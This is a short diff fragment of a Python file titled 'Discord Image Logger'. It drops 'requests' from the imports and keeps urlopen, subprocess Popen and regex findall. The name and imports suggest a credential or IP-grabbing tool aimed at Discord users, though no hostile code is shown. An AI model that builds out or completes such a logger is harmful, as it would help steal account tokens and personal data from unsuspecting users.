@@ -12,7 +12,7 @@ from json import loads
 from re import findall
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
-import requests, json, os
+import json, os
 from datetime import datetime
 
 __app__ = "Discord Image Logger"
